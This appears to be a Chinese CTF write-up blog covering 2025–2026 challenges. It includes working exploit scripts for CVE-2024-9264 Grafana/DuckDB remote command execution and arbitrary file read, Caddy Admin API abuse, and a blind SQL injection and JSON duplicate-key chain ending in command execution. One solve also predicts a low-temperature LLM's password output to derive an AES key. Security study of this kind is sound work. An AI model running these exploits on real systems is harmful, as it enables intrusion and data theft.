+++
date = '2026-05-10'
draft = false
title = 'CTFs WriteUp in 2026'
slug = 'ctfs-writeup-26'
author = 'laboon'
tags = ['ctf-writeup','cybersecurity']
showtoc = true
showrightsidebar = true
rightSidebarWidgets = ["profile", "tags", "meta"]
sidebarAuthor = "laboon"
sidebarBio = "Happy Hacking"
+++

> 本栏目持续更新一些零散的2025-2026年 CTF 题目，以此记录

## CISCN@2025

### The Silent Heist - AI

使用GaussianCopula进行数据高维关系分布的拟合，生成100000份数据，发现错误率在50/6000。

```python
import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
import seaborn as sns
from copulae import GaussianCopula,elliptical, StudentCopula
from scipy.stats import norm
from sklearn.preprocessing import StandardScaler

df = pd.read_csv('public_ledger.csv')

df = df.fillna(df.mean())
scaler = StandardScaler()
scaled_data = scaler.fit_transform(df)
print(scaled_data.shape) 

_, ndim = scaled_data.shape
copula = GaussianCopula(dim=ndim)
copula.fit(scaled_data)

new_data = copula.random(100000)

original_distribution = norm(loc=df.mean(), scale=df.std())
recovered_data = original_distribution.ppf(new_data)

generated_df = pd.DataFrame(recovered_data, columns=df.columns)
generated_df.to_csv('generated_ledger.csv', index=False, encoding='utf-8')

sns.heatmap(pd.DataFrame(recovered_data).corr(), annot=True)
plt.title("Generated Data Correlation")
plt.show()

for i in range(recovered_data.shape[1]):
    plt.hist(recovered_data[:, i], bins=30, alpha=0.5, label=f"Feature {i}")
plt.title("Generated Data Distribution")
plt.legend()
plt.show()
```

再进行数据清理，去除非常极端的异常值，使用IQR法

```python
import pandas as pd

df = pd.read_csv('generated_ledger.csv')

def remove_outliers_iqr(df, threshold=1.5):
    Q1 = df.quantile(0.25)
    Q3 = df.quantile(0.75)
    IQR = Q3 - Q1
    df_cleaned = df[~((df < (Q1 - threshold * IQR)) | (df > (Q3 + threshold * IQR))).any(axis=1)]
    return df_cleaned

df_cleaned = remove_outliers_iqr(df, threshold=1.5)

df_cleaned.to_csv('cleaned_generated_ledger.csv', index=False, encoding='utf-8')
```

最后随机在极大样本中间sample出总金额大于2000000的样本，使用pwntools将csv文件转化为流提交。

```python
import csv

from pwn import *

csv_file_path = 'cleaned_generated_ledger.csv'
url = ''

context.log_level = 'info'

p = remote('', 28783)

import random

import pandas as pd

df = pd.read_csv(csv_file_path)

def select_rows(dataframe, target_sum):
    while True:
 
        selected_rows = dataframe.sample(n=random.randint(5000, 6000))
      
        if (selected_rows[df.columns[0]]).sum() > target_sum:
            return selected_rows


target_sum = 2000000

filtered_rows = select_rows(df, target_sum)

filtered_rows.to_csv('output.csv', index=False)

with open("output.csv", mode='r', newline='') as file:
    reader = csv.reader(file)
    header = next(reader)  
  
    data = []
    for row in reader:
        data.append(','.join(row))  

p.sendlineafter("...","feat_0,feat_1,feat_2,feat_3,feat_4,feat_5,feat_6,feat_7,feat_8,feat_9,feat_10,feat_11,feat_12,feat_13,feat_14,feat_15,feat_16,feat_17,feat_18,feat_19")


data.append('EOF')

cnt = 0
for i in data:
    p.sendline(i)
    cnt+=1

print(cnt)

print("Data sent successfully!")

p.interactive()
```

## SUCTF@2026

### SU_easyLLM - AI

访问目标返回动态JSON：
{
  "algo": "AES-128-CBC",
  "iv_b64": "...",
  "ciphertext_b64": "...",
  "key_derivation": "key = SHA256(LLM_output)[:16]",
  "llm": {
    "provider": "z.ai",
    "model": "GLM-4-Flash",
    "temperature": 0.28,
    "system_prompt": "You are a password generator...",
    "user_prompt": "Generate the password now."
  }
}

关键漏洞点：

- 每次请求实时生成新密文（IV不同），说明后端实时调用LLM生成密码
- temperature=0.28：极低温度导致输出分布高度集中（低熵），模型倾向于生成固定模式（如pw-abcdefgh）
- 无法通过GET/POST参数注入提示词（405/参数无效）
0x02 攻击原理：概率交叉解密

利用同分布独立采样特性：

1. 服务器和我使用完全相同的配置（temperature=0.28, 相同prompt）
2. 低温度下，密码空间极窄（Top-3候选覆盖>95%概率）
3. 我通过API本地采样建立候选集，与服务器生成的密码概率重叠

公式：$P(\text{成功}) = 1 - (1 - \sum_{i=1}^{k} p_i)^n$，其中 $$p_i$$ 为Top-k候选概率，$n$为尝试轮数。当Top-3覆盖95%时，10轮成功率趋近100%。

```python
import base64
import hashlib
import json
import os
from collections import Counter

import requests
from Crypto.Cipher import AES

# ============ 配置 ============
API_KEY = ""

# 端点二选一（国内网络建议用bigmodel.cn）
API_ENDPOINT = "https://open.bigmodel.cn/api/paas/v4/chat/completions"
# API_ENDPOINT = "https://api.z.ai/api/paas/v4/chat/completions"

TARGET_URL = ""

# 优先使用题目显示的模型名称，失败时可切换为 glm-4.7-flash
MODEL_NAME = "glm-4-flash"  # 或尝试 "glm-4.7-flash" / "glm-4.5-flash"

CACHE_FILE = "password_samples.json"

def get_server_challenge():
    r = requests.get(TARGET_URL, timeout=10)
    d = r.json()
    return {
        "iv": base64.b64decode(d["iv_b64"]),
        "cipher": base64.b64decode(d["ciphertext_b64"]),
    }

def collect_candidates(n=50, use_cache=True):
    """
    收集候选密码，支持本地缓存
    如果API返回模型不存在错误，请手动修改 MODEL_NAME 为 "glm-4.7-flash"
    """
    # 尝试读取缓存
    if use_cache and os.path.exists(CACHE_FILE):
        with open(CACHE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            passwords = data.get("passwords", [])
            print(
                f"[+] 从本地缓存加载 {len(passwords)} 个样本 (模型: {data.get('model', 'unknown')})"
            )
            counter = Counter(passwords)
            top3 = [p[0] for p in counter.most_common(3)]
            print(f"[+] 候选密码: {top3}")
            return top3

    # API采样
    passwords = []
    headers = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}

    print(f"[*] 正在采样 {n} 个密码 (模型: {MODEL_NAME}, temperature: 0.28)...")

    for i in range(n):
        try:
            resp = requests.post(
                API_ENDPOINT,
                headers=headers,
                json={
                    "model": MODEL_NAME,
                    "messages": [
                        {
                            "role": "system",
                            "content": "You are a password generator.\nOutput ONE password only.\nFormat strictly: pw-xxxxxxxx where x are letters.\nNo explanation, no quotes, no punctuation.",
                        },
                        {"role": "user", "content": "Generate the password now."},
                    ],
                    "temperature": 0.28,
                    "max_tokens": 20,
                },
                timeout=30,
            )

            # 检查错误
            if resp.status_code != 200:
                error = resp.json()
                print(f"    [{i + 1}] API错误: {error}")
                if "model" in str(error).lower():
                    print(
                        "[!] 模型名称可能错误，请尝试修改 MODEL_NAME 为 'glm-4.7-flash'"
                    )
                break

            pwd = resp.json()["choices"][0]["message"]["content"].strip()
            passwords.append(pwd)
            print(f"    [{i + 1:2d}/{n}] {pwd}")

        except Exception as e:
            print(f"    [{i + 1:2d}] 错误: {e}")

    if not passwords:
        print("[-] 采样失败，请检查API Key和模型名称")
        return []

    # 保存缓存
    cache_data = {
        "model": MODEL_NAME,
        "temperature": 0.28,
        "sample_count": len(passwords),
        "passwords": passwords,
        "frequency": dict(Counter(passwords)),
    }
    with open(CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache_data, f, indent=2, ensure_ascii=False)
    print(f"[+] 已保存到 {CACHE_FILE}")

    counter = Counter(passwords)
    top3 = [p[0] for p in counter.most_common(3)]
    print(f"[+] 频率统计: {counter.most_common()}")
    print(f"[+] 候选密码: {top3}")
    return top3

def decrypt(iv, cipher, password):
    key = hashlib.sha256(password.encode()).digest()[:16]
    aes = AES.new(key, AES.MODE_CBC, iv)
    try:
        plain = aes.decrypt(cipher)
        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            text = plain[:-pad_len].decode("utf-8", errors="ignore")
            if "flag" in text.lower() or "{" in text:
                return text
    except:
        pass
    return None

def main():
    print("=" * 60)
    print("SU_easyLLM 概率交叉解密攻击")
    print(f"模型: {MODEL_NAME} | 缓存: {CACHE_FILE}")
    print("=" * 60)

    candidates = collect_candidates(50, use_cache=True)
    if not candidates:
        return

    print(f"\n[*] 开始解密尝试...")
    for round in range(20):
        server = get_server_challenge()
        for pwd in candidates:
            result = decrypt(server["iv"], server["cipher"], pwd)
            if result:
                print(f"\n[+] 第{round + 1}轮成功！")
                print(f"[+] 服务器密码: {pwd}")
                print(f"[+] FLAG: {result}")
                with open("flag.txt", "w") as f:
                    f.write(result)
                return
        print(f"[-] Round {round + 1}: 候选不匹配")

    print("\n[-] 20轮失败。可能原因：")
    print("    1. 服务器实际使用的不是GLM-4-Flash（而是其他模型/温度）")
    print("    2. 需要删除缓存重新采样")
    print("    3. 尝试修改 MODEL_NAME 为 'glm-4.7-flash' 或 'glm-4.5-flash'")

if __name__ == "__main__":
    main()
```

```bash
============================================================
SU_easyLLM 概率交叉解密攻击
模型: glm-4-flash | 缓存: password_samples.json
============================================================
[*] 正在采样 50 个密码 (模型: glm-4-flash, temperature: 0.28)...
    [ 1/50] pw-8g7h9j0k
    [ 2/50] pw-8d2f3g4h
    [ 3/50] pw-9d2f3g4h
    [ 4/50] pw-8d4f2h7k
    [ 5/50] pw-5d2h3k4l
    [ 6/50] pw-9h2k3l4
    [ 7/50] pw-9z8v7b6
    [ 8/50] pw-8k7q4h6v2
    [ 9/50] pw-5d9z2v7q1
    [10/50] pw-8d3f2h6j7
    [11/50] pw-8d4f2h7k
    [12/50] pw-9d2f3k7v
    [13/50] pw-Ab1vE2p
    [14/50] pw-9d2f3k4l
    [15/50] pw-Abcde1f
    [16/50] pw-8Z9p0L2N
    [17/50] pw-9d2f3k7v
    [18/50] pw-AbcDfghIjkl
    [19/50] pw-AbcDfgh
    [20/50] pw-5b9t3v2r
    [21/50] pw-7h2k4l9n6
    [22/50] pw-7d3p4k2l
    [23/50] pw-8d2f3g4h
    [24/50] pw-9v2k8p7z
    [25/50] pw-Abcde1f
    [26/50] pw-8z4v2b6r
    [27/50] pw-8v9k2l3
    [28/50] pw-AbcD5fHk
    [29/50] pw-9d3v2k7j
    [30/50] pw-AbcdeFgh
    [31/50] pw-5C9R2P8Z
    [32/50] pw-AbcdeFg
    [33/50] pw-8d2f3g4h
    [34/50] pw-9d3f2g
    [35/50] pw-9v2k7p8
    [36/50] pw-Abcde1f
    [37/50] pw-AbcDfghIjkl
    [38/50] pw-9v7p8k2r
    [39/50] pw-9h3p2v5k
    [40/50] pw-AbcDfgh
    [41/50] pw-7b2t9v8z
    [42/50] pw-AbcDfghIjkl
    [43/50] pw-9v8h7g6f
    [44/50] pw-AbcDfghIjkl
    [45/50] pw-9h2v7b8z
    [46/50] pw-9v2t8k7r
    [47/50] pw-9z8v7b6
    [48/50] pw-9v8t7y6
    [49/50] pw-5b2h7k9q
    [50/50] pw-Abcde1f
[+] 已保存到 password_samples.json
[+] 频率统计: [('pw-Abcde1f', 4), ('pw-AbcDfghIjkl', 4), ('pw-8d2f3g4h', 3), ('pw-8d4f2h7k', 2), ('pw-9z8v7b6', 2), ('pw-9d2f3k7v', 2), ('pw-AbcDfgh', 2), ('pw-8g7h9j0k', 1), ('pw-9d2f3g4h', 1), ('pw-5d2h3k4l', 1), ('pw-9h2k3l4', 1), ('pw-8k7q4h6v2', 1), ('pw-5d9z2v7q1', 1), ('pw-8d3f2h6j7', 1), ('pw-Ab1vE2p', 1), ('pw-9d2f3k4l', 1), ('pw-8Z9p0L2N', 1), ('pw-5b9t3v2r', 1), ('pw-7h2k4l9n6', 1), ('pw-7d3p4k2l', 1), ('pw-9v2k8p7z', 1), ('pw-8z4v2b6r', 1), ('pw-8v9k2l3', 1), ('pw-AbcD5fHk', 1), ('pw-9d3v2k7j', 1), ('pw-AbcdeFgh', 1), ('pw-5C9R2P8Z', 1), ('pw-AbcdeFg', 1), ('pw-9d3f2g', 1), ('pw-9v2k7p8', 1), ('pw-9v7p8k2r', 1), ('pw-9h3p2v5k', 1), ('pw-7b2t9v8z', 1), ('pw-9v8h7g6f', 1), ('pw-9h2v7b8z', 1), ('pw-9v2t8k7r', 1), ('pw-9v8t7y6', 1), ('pw-5b2h7k9q', 1)]
[+] 候选密码: ['pw-Abcde1f', 'pw-AbcDfghIjkl', 'pw-8d2f3g4h']

[*] 开始解密尝试...
[-] Round 1: 候选不匹配
[-] Round 2: 候选不匹配
[-] Round 3: 候选不匹配
[-] Round 4: 候选不匹配

[+] 第5轮成功！
[+] 服务器密码: pw-8d2f3g4h
[+] FLAG: SUCTF{LLM_w1ll_ch4nge_ev3rything}
```

### SU_Thief - Web

漏洞入口: Grafana v11.0.0 的 CVE-2024-9264 (DuckDB shellfs RCE)

利用前提：1. DuckDB存在 2. 拥有用户名登录凭据，试出弱密码admin 1q2w3e

利用链:

1. 入口: 利用 DuckDB shellfs 扩展执行任意命令
SELECT 1;install shellfs from community;LOAD shellfs;
SELECT * FROM read_csv('id > /tmp/out |');

2. 发现: /tmp 目录存在 Caddy 相关文件, 实际上是因为本次比赛共享环境的原因，标准流程应该是通过ps查看到caddy进程，从而怀疑caddy的配置失误：
    - caddy_ctf: Caddy 配置文件，暴露 :80/x/* 映射到 /root，但端口被 Grafana 反向代理拦截
    - caddy.sh: 关键脚本，使用 Caddy Admin API (localhost:2019) 动态配置

3. 核心: "Closest thief" 指 Caddy 进程本身：
    - Caddy 以 root 运行（绑定 80 端口）
    - Admin API (:2019) 仅监听 localhost，容器内可访问
    - 通过 API 动态添加路由，在 :8888 暴露 /root 目录

4. Flag: 执行脚本利用 Caddy Admin API 读取 flag, 其实不是很确定这个脚本是不是官方放上去的

```bash
# caddy.sh 内容
curl -X POST http://localhost:2019/config/apps/http/servers/srv1 \
  -d '{"listen":[":8888"],"routes":[{"handle":[{"handler":"file_server","root":"/root"}]}]}'
curl -s http://localhost:8888/flag
# [Output ]:
# ---DONE---\x0ASUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}\x0A
```

相关代码：

```python
#!/usr/bin/env python3 - file.py
import argparse
import base64
import json
import sys
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings()

def exploit(target, user, pwd, filepath):
    s = requests.Session()
    s.verify = False

    # Login
    login_url = urljoin(target, "/login")
    s.post(login_url, json={"user": user, "password": pwd}, timeout=10)

    # Exploit
    url = urljoin(target, "/api/ds/query?ds_type=__expr__&expression=true")
    payload = {
        "queries": [
            {
                "refId": "B",
                "datasource": {"type": "__expr__", "uid": "__expr__"},
                "type": "sql",
                "expression": f'SELECT content FROM read_blob("{filepath}")',
                "hide": False,
            }
        ],
        "from": "1729313027261",
        "to": "1729334627261",
    }

    r = s.post(url, json=payload, timeout=15)
    if r.status_code != 200:
        return None

    try:
        frames = r.json()["results"]["B"]["frames"]
        if not frames:
            return None
        content = frames[0]["data"]["values"][0][0]
        if isinstance(content, str):
            try:
                return base64.b64decode(content).decode("utf-8", errors="ignore")
            except:
                return content
    except:
        return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-u", "--user", default="admin", help="Username")
    parser.add_argument("-p", "--password", default="admin", help="Password")
    parser.add_argument("-f", "--file", required=True, help="File path to read")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    result = exploit(target, args.user, args.password, args.file)

    if result:
        print(result)
    else:
        print("[-] Failed to read file")

if __name__ == "__main__":
    main()
```

```python
#!/usr/bin/env python3 - rce.py
import argparse
import base64
import json
import sys
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings()

class CorrectDecoder:
    def __init__(self, target, user, pwd):
        self.target = target.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self._login(user, pwd)

    def _login(self, user, pwd):
        url = urljoin(self.target, "/login")
        self.session.post(url, json={"user": user, "password": pwd}, timeout=10)
        print("[+] Login successful")

    def _query(self, expression):
        url = urljoin(self.target, "/api/ds/query?ds_type=__expr__&expression=true")
        payload = {
            "queries": [
                {
                    "refId": "B",
                    "datasource": {"type": "__expr__", "uid": "__expr__"},
                    "type": "sql",
                    "expression": expression,
                    "hide": False,
                }
            ],
            "from": "1729313027261",
            "to": "1729334627261",
        }
        return self.session.post(url, json=payload, timeout=15)

    def run_cmd(self, cmd):
        """执行命令，返回原始 API 响应内容"""
        b64_cmd = base64.b64encode(cmd.encode()).decode()
        exp = f"SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('echo {b64_cmd} | base64 -d | sh > /tmp/cmd_output 2>&1 |');"

        r = self._query(exp)
        if r.status_code != 200:
            return None, f"[Exec HTTP {r.status_code}]"

        r = self._query('SELECT content FROM read_blob("/tmp/cmd_output");')
        if r.status_code != 200:
            return None, f"[Read HTTP {r.status_code}]"

        try:
            frames = r.json()["results"]["B"]["frames"]
            if not frames:
                return None, "[No frames]"

            # 获取原始返回值
            raw_value = frames[0]["data"]["values"][0][0]

            if not raw_value:
                return None, "[Empty value]"

            # 检查是否已经是可读文本（如 ls 输出）
            if isinstance(raw_value, str):
                # 如果是可打印字符占多数，直接返回
                printable = sum(
                    1 for c in raw_value if 32 <= ord(c) < 127 or c in "\n\r\t"
                )
                if printable / len(raw_value) > 0.8:
                    return raw_value, "[Plain text]"

                # 否则尝试 base64 解码（可能是编码后的二进制）
                try:
                    # 可能是 base64 字符串
                    decoded = base64.b64decode(raw_value)
                    return decoded.decode("utf-8", errors="replace"), "[Base64 decoded]"
                except:
                    return raw_value, "[Raw string]"

            return str(raw_value), "[Unknown type]"

        except Exception as e:
            return None, f"[Parse error: {e}]"

    def test(self, cmd):
        raw, status = self.run_cmd(cmd)

        print(f"[Command]: {cmd}")
        print(f"[Status ]: {status}")
        if raw:
            print(f"[Output ]:\n{raw[:500]}")
        else:
            print("[Output ]: None")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-u", "--user", default="admin")
    parser.add_argument("-p", "--password", default="admin")
    parser.add_argument("-c", "--command", required=True)
    args = parser.parse_args()

    d = CorrectDecoder(args.target, args.user, args.password)
    d.test(args.command)

if __name__ == "__main__":
    main()
```

```bash
python rce.py -t  -u admin -p 1q2w3e -c "ls -la /tmp/"
[+] Login successful
[Command]: ls -la /tmp/
[Status ]: [Plain text]
[Output ]:
total 144\x0Adrwxrwxrwt 1 root    root    4096 Mar 14 14:42 .\x0Adrwxr-xr-x 1 root    root    4096 Mar 14 04:04 ..\x0A-rwxrwxr-x 1 grafana grafana  274 Mar 14 05:26 caddy.sh\x0A-rw-rw-r-- 1 grafana grafana  118 Mar 14 06:16 caddy_ctf\x0A-rw-rw-r-- 1 grafana grafana    8 Mar 14 14:42 caddy_out\x0A-rw-rw-r-- 1 grafana grafana   41 Mar 14 06:16 caddy_restore\x0A-rw-rw-r-- 1 grafana grafana    0 Mar 14 14:42 cmd_output\x0A-rw-rw-r-- 1 grafana grafana   26 Mar 14 09:13 codex_test\x0A-rw-rw-r-- 1 graf

python rce.py -t http:// -u admin -p 1q2w3e -c "cat /tmp/caddy_ctf"
[+] Login successful
[Command]: cat /tmp/caddy_ctf
[Status ]: [Plain text]
[Output ]:    
:80 {\x0A    handle_path /x/* {\x0A        root * /root\x0A        file_server browse\x0A    }\x0A    reverse_proxy 127.0.0.1:3000\x0A}\x0A 

python file.py -t http:// -u admin -p 1q2w3e -f "/tmp/caddy.sh"      
#!/bin/sh\x0Acurl -s -X POST http://localhost:2019/config/apps/http/servers/srv1 -H \x22Content-Type: application/json\x22 -d \x22{\x5C\x22listen\x5C\x22:[\x5C\x22:8888\x5C\x22],\x5C\x22routes\x5C\x22:[{\x5C\x22handle\x5C\x22:[{\x5C\x22handler\x5C\x22:\x5C\x22file_server\x5C\x22,\x5C\x22root\x5C\x22:\x5C\x22/root\x5C\x22}]}]}\x22\x0Aecho \x22---DONE---\x22\x0Acurl -s http://localhost:8888/flag\x0A

python rce.py -t http:// -u admin -p 1q2w3e -c "bash /tmp/caddy.sh"
[+] Login successful
[Command]: bash /tmp/caddy.sh
[Status ]: [Plain text]
[Output ]:
---DONE---\x0ASUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}\x0A
```

## ACTF@2026

### 12307 - Web

这是一个模拟12307铁路售票系统的Web CTF题目，包含多个微服务：

- `ticketing_api` - 订单服务
- `station_portal` - 车站门户（含SQL注入）
- `station_import` - 数据导入（SSRF入口）
- `receipt_signer` - 签名验证（JSON重复键漏洞）
- `print_spooler` - 打印服务（命令执行）
- `settlement_worker` - 结算服务

核心漏洞链

1. 身份伪造
    `sso_gateway` 弱字符串校验，可伪造trusted passenger session

2. SQL注入

    `station_portal/app.py:70` 的 `fare_scope_expression()` 函数：

    ```python
    if scope.get("mode") == "legacy-rank":
        return str(scope.get("expr", "ticket_no"))[:240]  # 直接拼入ORDER BY
    ```

    可盲注提取 `claim_salt`

3. JSON重复键绕过

    `receipt_signer/app.py:92-93`：

    ```python
    public_view = json.loads(payload_text, object_pairs_hook=first_wins_object)  # 取第一个key
    render_view = json.loads(payload_text)  # 取最后一个key
    ```

    构造重复key可绕过验证，控制 `driverProgram` 和 `driverArgument`

4. 命令执行

    `print_spooler/worker.py:61`：

    ```python
    pid = os.posix_spawn(program, [program, argument], ...)
    ```

    Dockerfile中 `/usr/bin/base64` 设置了SUID位，可读取 `/flag`

攻击步骤

```bash
POST /api/mobile/identity/continue          # 1. 伪造身份
POST /api/mobile/orders                      # 2. 创建waitlisted订单(G7608 business)
POST /api/desk/fares/reprice                 # 3. SQL注入提取claim_salt
POST /api/desk/tickets/adjust                # 4. 写入结算规则
POST /api/corporate/imports/relay            # 5. 设置sampled=1, batch_open=1
POST /api/desk/notices                       # 6. 注入proxyHint
POST /api/corporate/imports/relay            # 7. 污染Redis(lane/board/jwks)
WebSocket /api/connect/boarding              # 8. 写入ledger attestation
POST /api/corporate/imports/relay            # 9. 激活layout entitlement
POST /api/corporate/reconciliation           # 10. 创建deferred batch
POST /api/corporate/receipts/prepare         # 11. JSON重复键构造恶意carrierSeal
POST /api/corporate/imports/relay            # 12. fulfillment epoch
POST /api/corporate/settlement/schedule      # 13. 触发settlement
GET /api/fare-samples/reconciliation/{id}    # 14. 读取base64编码的flag
```

```python
#!/usr/bin/env python3
"""Combined exploit for 12307 CTF. Usage: python solve_final.py <BASE_URL>"""

import sys, json, requests, time, base64, hmac, hashlib, re, string, websocket, random

BASE = (
    sys.argv[1].rstrip("/")
    if len(sys.argv) > 1
    else ""
)
print(f"[*] Target: {BASE}")

STATION = "HGH"
TRAIN = "G7608"
SEAT = "business"
ROUTE = "delta-window-27"
SECRET = "e94c0a8d-12307-hgh-trusted"
KID = "POL-HGH-TRUSTED"
TICKET_NO = "T-HGH-7608-019"


def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


s = requests.Session()


def post(path, obj, **kw):
    r = s.post(f"{BASE}{path}", json=obj, timeout=10, **kw)
    return r


def get(path, **kw):
    r = s.get(f"{BASE}{path}", timeout=10, **kw)
    return r


# 1. Identity
print("[1] forging identity")
r = post(
    "/api/mobile/identity/continue",
    {
        "passenger": "ctfer",
        "stationCode": STATION,
        "partnerMetadata": {
            "entityID": "railway-partner",
            "compatBinding": "x-accel",
            "role": "PassengerIdentityProvider",
        },
        "relayState": {"next": "rail://continue/seat-hold"},
        "assertion": "<Assertion><Audience>12307</Audience><NameID>mobile-passenger</NameID><Signature>RelayState</Signature></Assertion>",
        "trustLevel": ["mobile", "partner", "settlement"],
    },
)
print(f"    {r.status_code}")

# 2. Complete session + waitlist channel
print("[2] holdFlow")
r = post(
    "/api/mobile/orders/hold",
    {"trainId": TRAIN, "seatClass": SEAT, "holdMode": "waitlist"},
)
ws_ticket = s.cookies.get("waitlist_session", "")
print(f"    ws_ticket={ws_ticket[:8]}...")

# 3. Create waitlisted order
print("[3] create waitlisted order")
r = post(
    "/api/mobile/orders", {"trainId": TRAIN, "seatClass": SEAT, "passenger": "ctfer"}
)
data = r.json()
oid = data["order"]["id"]
print(f"    oid={oid} status={data['order']['status']}")

# 4. SQL injection to extract claim_salt
print("[4] SQLi claim_salt")


def sqli_cond(pos, mid):
    expr = f"IF((SELECT ASCII(SUBSTR(claim_salt,{pos},1))FROM station_claim_artifacts WHERE order_id='{oid}')>{mid},IF(LEFT(ticket_no,6)='T-BJP-',0,1),IF(LEFT(ticket_no,6)='T-HGH-',0,1))"
    r = post(
        "/api/desk/fares/reprice",
        {
            "stationCode": STATION,
            "amount": 1,
            "tariffScope": {"mode": "legacy-rank", "expr": expr},
        },
    )
    return r.json().get("quote", {}).get("bucket", "") == "north-window"


salt = ""
for pos in range(1, 10):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if sqli_cond(pos, mid):
            lo = mid + 1
        else:
            hi = mid
    salt += chr(lo)
print(f"    salt={salt}")

# 5. Compute proof
digest = hashlib.sha256(
    f"{oid}|{TRAIN}|{STATION}|{TICKET_NO}|{salt}".encode()
).hexdigest()
proof = f"CP-{salt}-{digest[:12]}"
print(f"    proof={proof}")

# 6. adjust_ticket
print("[5] adjust_ticket")
memo = json.dumps(
    {
        "stationCode": STATION,
        "channel": "fare-desk",
        "lineItems": {
            "reason": "FARE-91",
            "layout": "folio-grid-27",
            "device": "PR-HGH-042",
            "enabled": True,
        },
    },
    separators=(",", ":"),
)
r = post(
    "/api/desk/tickets/adjust",
    {"ticketNo": TICKET_NO, "claimProof": proof, "delta": 0, "memo": memo},
)
print(f"    {r.status_code} {r.json().get('status', '?')}")

# 7. station-desk-ledger
print("[6] station-desk-ledger")
post(
    "/api/corporate/imports/relay",
    {
        "stationCode": STATION,
        "adapter": "station-desk-ledger",
        "target": f"rail-cache://rules/apply?orderId={oid}&stationCode={STATION}",
        "payload": "",
    },
)

# 8. Notice + partner feed
print("[7] notice + partner-feed")
post(
    "/api/desk/notices",
    {
        "stationCode": STATION,
        "title": "x",
        "body": "x",
        "proxyHint": f"X-Desk-Lane: {ROUTE}\r\nX-Board-Window: seat-window-e27\r\nX-Desk-Key-Id: {KID}\r\nX-Desk-Key: {ROUTE}",
    },
)
post(
    "/api/corporate/imports/relay",
    {
        "stationCode": STATION,
        "adapter": "station-partner-feed",
        "target": f"rail-cache://redis/partner/metadata?stationCode={STATION}",
        "payload": "",
    },
)

# 9. WebSocket boarding
print("[8] WebSocket boarding")
r = post(
    "/api/mobile/orders/hold",
    {"trainId": TRAIN, "seatClass": SEAT, "holdMode": "waitlist"},
)
ws_ticket = s.cookies.get("waitlist_session", "")
ledger_ref = ""
if ws_ticket:
    try:
        ws = websocket.create_connection(
            f"ws://{BASE.split('//')[1]}/api/connect/boarding?stationCode={STATION}",
            header={
                "Cookie": f"passenger_session={s.cookies.get('passenger_session')}; waitlist_session={ws_ticket}",
                "X-Waitlist-Session": ws_ticket,
            },
            timeout=10,
        )
        hello = json.loads(ws.recv())
        ch = hello.get("channel", ws_ticket[:8])
        ws.send(json.dumps({"type": "boarding.hello", "channel": ch}))
        ws.recv()
        ws.send(
            json.dumps(
                {
                    "type": "boarding.bind",
                    "trainId": TRAIN,
                    "seatClass": SEAT,
                    "topic": "seat-consist",
                }
            )
        )
        ws.recv()
        ws.send(
            json.dumps(
                {
                    "type": "boarding.confirm",
                    "orderId": oid,
                    "stationCode": STATION,
                    "epoch": "boarding",
                }
            )
        )
        r = json.loads(ws.recv())
        ledger_ref = r.get("ledgerRef", "")
        print(f"    ledgerRef={ledger_ref}")
        ws.close()
    except Exception as e:
        print(f"    WS error: {e}")

# 10. enterprise-clearing
print("[9] enterprise-clearing")
post(
    "/api/corporate/imports/relay",
    {
        "stationCode": STATION,
        "adapter": "enterprise-clearing",
        "target": f"rail-mesh://clearing/layout?orderId={oid}&stationCode={STATION}",
        "payload": "",
    },
)

# 11. Create deferred batch
print("[10] create deferred batch")
batch = "B" + "".join(
    random.choice(string.ascii_uppercase + string.digits) for _ in range(10)
)
template = "Reconciliation {{orderId}} {{status}} {{reconciliation.receipt}}"
tdigest = hashlib.sha256(template.encode()).hexdigest()
post(
    "/api/corporate/reconciliation",
    {
        "orderId": oid,
        "stationCode": STATION,
        "batchId": batch,
        "reportType": "carrier-closeout",
        "defer": True,
    },
)
print(f"    batch={batch}")

# 12. CarrierSeal with duplicate keys
print("[11] receipt signer")
hdr = b64url(
    json.dumps(
        {"alg": "HS256", "typ": "rail-carrier-seal", "kid": KID}, separators=(",", ":")
    ).encode()
)
pairs = [
    ("batchId", batch),
    ("orderId", oid),
    ("stationCode", STATION),
    ("templateDigest", tdigest),
    ("routeName", ROUTE),
    ("ledgerRef", ledger_ref),
    ("printProfile", "counter-copy"),
    ("printer", "thermal-standard"),
    ("prefix", "reconciliation"),
    ("cell", "receipt"),
    ("printProfile", "clearing-batch"),
    ("printer", "line-printer"),
    ("driverProgram", "/usr/bin/base64"),
    ("driverArgument", "/flag"),
]
payload_text = (
    "{" + ",".join(json.dumps(k) + ":" + json.dumps(v) for k, v in pairs) + "}"
)
p_b64 = b64url(payload_text.encode())
sig = b64url(
    hmac.new(SECRET.encode(), f"{hdr}.{p_b64}".encode(), hashlib.sha256).digest()
)

r = post(
    "/api/corporate/receipts/prepare",
    {
        "orderId": oid,
        "stationCode": STATION,
        "batchId": batch,
        "templateDigest": tdigest,
        "trustLevel": ["mobile", "partner", "settlement"],
        "carrierSeal": {"protected": hdr, "payload": p_b64, "signature": sig},
    },
    headers={
        "X-Enterprise-Gateway": "station-mesh",
        "X-Partner-Shape": "json-array",
        "X-Clearing-Lane": ROUTE,
    },
)
print(f"    {r.status_code} {r.json().get('status', '?')}")

# 13. fulfillment epoch
print("[12] fulfillment epoch")
post(
    "/api/corporate/imports/relay",
    {
        "stationCode": STATION,
        "adapter": "fulfillment-monitor",
        "target": f"rail-cache://fulfillment?orderId={oid}&stationCode={STATION}",
        "payload": "",
    },
)

# 14. Schedule
print("[13] schedule settlement")
r = post("/api/corporate/settlement/schedule", {"batchId": batch})
print(f"    {r.json()}")

# 15. Poll
print("[14] polling...")
for i in range(30):
    time.sleep(1)
